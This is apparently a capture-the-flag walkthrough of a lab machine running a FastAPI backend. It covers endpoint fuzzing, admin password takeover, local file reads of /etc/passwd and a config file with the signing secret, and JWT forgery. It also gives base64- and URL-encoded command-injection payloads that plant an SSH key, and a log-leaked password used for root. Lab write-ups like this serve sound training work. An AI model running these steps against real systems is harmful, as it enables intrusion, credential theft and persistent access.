> LFI, command execution

# Ports

* **80** : uvicorn 
* **22** : openssh 8.2p1 ubuntu
### Port 80,22 is used for exploiting

# 80
### 1. Fuzzing Endpoints
1. Navigating to webpage shows us that this is an api endpoint that has no frontend as the reponse "Not Authorized" was displayed in json.
2. From the headers we can see look into uvicorn and we can see that fastapi is used in the server.
3. Using ffuf with dirbuster-2.3-medium wordlist gave us `docs`,`api` endpoints.
4. doc endpoint requires authorization.  api endpoint tells us about another endpoint `v1`
5. Navigating to `http://10.10.11.161/api/v1` tells us about two more endpoints `user` and `admin`
6. Navigating to `http://10.10.11.161/api/v1/admin/` gives us unauthorized message.
7. Navigating to `http://10.10.11.161/api/v1/user/1` gives us information about the admin including email address.
8. Simply trying a post request user and admin endpoints gives us a 422 result for `user/login` and gives us a hint about providing username.
9. `ffuf -u http://10.10.11.161/api/v1/user/FUZZ -w /usr/share/wordlist/Kalilist/dirb/common.txt -fc 405 -mc 422`
This gives us two endpoints signup and login

### 2. Sending Payloads
1. After capturing the request to `user/signup` in burpsuite we set the "Content-type: application/json" header and data as `{"email": "srr@htb.local", "password":"admin"}`
2. This gives a 201 saying created.
3. After that we login with `user/login` by setting header "Content-Type: application/x-www-form-urlencoded" and data as `username=srr@htb.local&password=admin`
4. This gives us a jwt token, which we can use it authenticate by using the http 'Authentication' header.

### 3. Authenticating
1. FastApi provides a UI for testing out various endpoints which is developed using swagger UI. This is in the `http://10.10.11.161/docs` path.
2. We capture the request to this route and add our `Authorization: Bearer <JWT token>`  header to the request  and forward it.
3. The page also makes request to openapi.json and we need to do the same to this request to successfully login to the web interface.

# 22
1. SSH port


# EXPLOITATION
We can use the `/api/v1/user/updatepass` endpoint to update the admin user's password. It only requires "guid" and new password. We can do it in the UI
We can switch to the admin account using the "Authorize" button on the top right corner in the UI.
As admin we can use endpoints `/admin/file` and `/admin/exec` . File requires a filename we can specify "file: /etc/passwd" and we can observe that LFI exists in this application.
`/admin/exec/whoami` does not work as it tells that debug key is not set for the JWT token

### Hampering JWT token
[jwt.io](http://jwt.io) provides a way to decrypt jwt token to see its keys. We can obtain our jwt token from the header of our requests to `admin/file` endpoint.
Using [jwt.io](http://jwt.io) we can decrypt the token to add "debug": true. But we need a signature to complete this.

We can use the /file endpoint to try to get the source code of the api to get the signature.
In /file endpoint
- "file": "/proc/self/cmdline" tells us that the source code files resides in /home/htb/uhc
- "file": "/proc/self/environ" tells us that the source code is in main.py at /home/htb/uhc/app
- "file":"/home/htb/uhc/app/main.py" gives us the source code of the api. We can look into the code and see that a 'settings' class was imported from app.core.config. This is a configuration file and this file could contain signature we need.
- "file":"/home/htb/uhc/app/core/config.py" , gives us the secret key as "SuperSecretSigninKey-HTB"

We can use this key to create our JWT token with "debug" key set to true at [jwt.io](https://jwt.io).

### Code execution.
We can use our custom JWT along with the /exec endpoint to execute commands.
1. Since we have SSH port open, we can add our public key to the machine's `authorized_keys` file so we can ssh using our private key.
2. Forward slashes (/) are creating problems in the endpoint, so we need to encode our payload and then decrypt back in the machine to execute it.
3. The payload need to be urlencoded before sending via the endpoint.

### Adding to authorized keys.

- `mkdir /home/htb/.ssh`  ==> $(echo bWtkaXIgL2hvbWUvaHRiLy5zc2g= | base64 -d) ==> urlencode the command
`http://10.10.11.161/admin/exec/%24%28echo%20bWtkaXIgL2hvbWUvaHRiLy5zc2g%3D%20%7C%20base64%20-d%29`

- `echo <YOUR SSH PUBLIC KEY> > /home/htb/.ssh/authorized_keys` 
This command need to be encrypted to two parts to get it to work.
1. `echo <YOUR SSH PUBLIC KEY>`  ==> base64 the command ==> $(echo /<base64 value/> | base64 -d)
2. `/home/htb/.ssh/authorized_keys`  ==> base64 the command ==> $(echo /<base64 value/> | base64 -d)
3. Then combining both parts:
$(echo /<base64 of first command/> | base64 -d) > $(echo /<base64 of second command/> | base64 -d)
4. This final command is urlencoded and send through the endpoint.

We can now ssh in `ssh htb@10.10.11.161`

# Actions in the low privilege shell

1. We can look inside the uhc folder in the home directory of htb user.
2. Inside `uhc` we can see `auth.log` file which tells us about authentication attempts to the api.
3. Inside auth.log we see an authentication attempt for `Tr0ub4dor&3`, this could be a password for the htb account or even the root
4. `sudo -l` to check the sudo previleges of htb. We find that the password didn't work for htb
5. `su root` with the password gave us root.

We are now root.